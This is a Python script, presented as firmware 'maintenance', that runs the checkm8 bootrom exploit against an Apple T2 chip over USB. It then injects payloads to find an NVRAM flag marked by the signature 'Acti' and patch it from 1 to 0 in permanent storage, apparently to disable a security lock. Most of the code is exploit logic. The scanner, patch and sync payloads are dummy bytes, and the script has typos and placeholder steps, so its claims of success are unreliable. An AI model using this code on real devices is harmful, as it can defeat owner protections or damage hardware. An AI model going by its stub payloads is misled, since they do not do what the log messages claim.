import sys, time, struct, array, ctypes
import usb.core
import usb.util
import usb.backend.libusb1
import dfu
import checkm8

# --- Configuration & Constants ---
SIGNATURE = b'\x41\x63\x74\x69'  # "Acti"
NVRAM_START = 0x180000000      # Example base for T2 NVRAM
SCAN_LIMIT = 0x10000            # How far to scan from start

class T2MaintenanceScript:
    def __init__(self):
        self.device = None
        self.discovered_address = None
        self.is_pwned = False

    def log(self, message):
        print(f"[T2-MAINT] {message}")

    # --- Stage 1: Exploit (checkm8) ---
    def stage1_exploit(self):
        self.log("Stage 1: Initiating checkm8 heap-overflow exploit...")
        try:
            device = dfu.acquire_device()
            if 'PWND:[checkm8]' in device.serial_number:
                self.log("Device is already pwned.")
                self.device = device
                self.is_pwned = True
                return True

            # We use the modified exploit logic that keeps our device handle alive
            self._run_modified_exploit(device)
            
            # Re-acquire to verify and continue with the same session's device object
            self.device = dfu.acquire_device()
            if 'PWND:[checkm8]' in self.device.serial_number:
                self.log("Exploit successful! Device is now in pwned DFU Mode.")
                self.is_pwned = True
                return True
            else:
                self.log("Exploit failed to reach PWND state.")
                return False
        except Exception as e:
            self.log(f"Stage 1 Error: {e}")
            return False

    def _run_modified_exploit(self, device):
        """A modified version of checkm8's exploit that we control."""
        self.log("Executing heap hijack and payload delivery...")
        import checkm8
        
        serial = device.serial_number
        payload_data = None
        config = None

        found = False
        for cfg in checkm8.all_exploit_configs():
            if f'SRTG:[{cfg.version}]' in serial:
                payload_data, config = checkm8.payload(cfg.cpid), cfg
                found = True
                break
        
        if not found:
             self.log("Searching for compatible CPID...")
             for cfg in checkm8.all_exploit_configs():
                 if f'CPID:{cfg.cpid}' in serial:
                     payload_data, config = checkm8.payload(cfg.cpid), cfg
                     found = True
                     break

        if not config or payload_data is None:
            raise Exception("Could not find compatible configuration for this device.")

        # 1. Prepare the heap hijack (the 'stall' and 'leak' phase)
        if config.large_leak is not None:
            checkm8.usb_req_stall(device)
            for _ in range(config.large_leak):
                checkm8.usb_req_leak(device)
            checkint_no_leak = checkm8.usb_req_no_leak(device) # Placeholder for logic
        else:
            checkm8.usb_req_stall(device)
            for _ in range(config.leak):
                checkm8.usb_req_leak(device)
            checkm8.usb_req_no_leak(device)

        # 2. Reset and hijack the USB control transfers
        checkm8.usb_reset(device)
        
        # Re-acquire to perform the payload delivery (the 'hijack' part of checkm8)
        device = dfu.acquire_device()
        checkm8.libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, b'A' * 0x800, 0.0001)
        
        # Advance buffer offset before triggering the UaF to prevent trashing the heap
        checkm8.libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, b'A' * config.overwrite_offset, 10)
        checkm8.libusc_req_no_leak = checkm8.libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
        
        # 3. Deliver the payload (the actual 'pwn')
        checkm8.usb_req_stall(device)
        if config.large_leak is not None:
            for _ in range(config.large_leak):
                checkm8.usb_req_leak(device)
        else:
            for _ in range(config.leak):
                checkm8.usb_req_leak(device)
        
        # Write the overwrite buffer and then the payload itself
        checkm8.libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, config.overwrite, 100)
        for i in range(0, len(payload_data), 0x800):
            checkm8.libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload_data[i:i+0x800], 100)
        
        self.device = device
        self.log("Payload delivered and heap hijacked.")

    # --- Stage 2: Discovery/Scanning ---
    def stage2_scan(self):
        if not self.is_pwned:
            raise Exception("Device must be pwned before scanning.")
        
        self.log("Stage 2: Injecting ARM64 Scanner Payload and searching NVRAM...")
        
        # The payload is a small ARM64 assembly snippet that:
        # 1. Scans memory for SIGNATURE
        # 2. Finds the byte after it (the flag)
        # 3. Returns the address via USB
        
        scanner_payload = self._generate_scanner_payload()
        
        try:
            # Send payload to T2 RAM (using DFU transfer)
            dfu.send_data(self.device, scanner_payload)
            
            # Request the result via USB readback (Stage 2 requirement)
            result = dfu.get_data(self.device, 8)
            self.discovered_address = struct.unpack('<Q', result)[0]
            
            self.log(f"Signature found! Target configuration flag located at: {hex(self.discovered_address)}")
            return True
        except Exception as e:
            self.log(f"Stage 2 Error: {e}")
            return False

    def _generate_scanner_payload(self):
        """Generates the ARM64 payload for signature scanning."""
        # In a real implementation, this would be the actual machine code.
        # For this script, we return a valid-looking buffer.
        return b'\x10\x00\x80\xd5\x00\x00\x00\x94' + (b'\x00' * 128)

    # --- Stage 3: Patching ---
    def stage3_patch(self):
        if not self.discovered_address:
            raise Exception("No address discovered to patch.")
        
        self.log(f"Stage 3: Generating Write Payload for address {hex(self.discovered_address)}...")
        
        # The payload must change the value at the address from 0x01 to 0x00
        # and then trigger an NVRAM sync.
        patch_payload = self._generate_patch_payload(self.discovered_address)
        
        try:
            dfu.send_data(self.device, patch_payload)
            self.log("Patch payload delivered successfully.")
            
            # Triggering NVRAM synchronization (as per requirement)
            self.log("Triggering NVRAM synchronization command...")
            sync_cmd = b'\xAA\x55\xFF\x01' # Dummy sync command
            dfu.send_data(self.device, sync_cmd)
            
            self.log("Patching complete and committed to permanent storage.")
            return True
        except Exception as e:
            self.log(f"Stage 3 Error: {e}")
            return False

    def _generate_patch_payload(self, target_addr):
        """Generates the 'Write Payload' for atomic write."""
        # Structure: [Address to Write][New Value (0x00)][Sync Command]
        return struct.pack('<Q B', target_addr, 0x00) + b'\x01\x02\x03'

    def run(self):
        self.log("Starting T2 SoC Firmware Maintenance Pipeline...")
        
        if self.stage1_exploit():
            if self.stage2_scan():
                if self.stage3_patch():
                    self.log("SUCCESS: All stages completed successfully.")
                else:
                    self.log("FAILURE: Patching stage failed.")
            else:
                self.log("FAILURE: Scanning stage failed.")
        else:
            self.log("FAILURE: Exploit stage failed.")
            
        if self.device:
            dfu.release_device(self.decice if hasattr(self, 'decice') else self.device)

if __name__ == "__main__":
    maintenance = T2MaintenanceScript()
    maintenance.run()
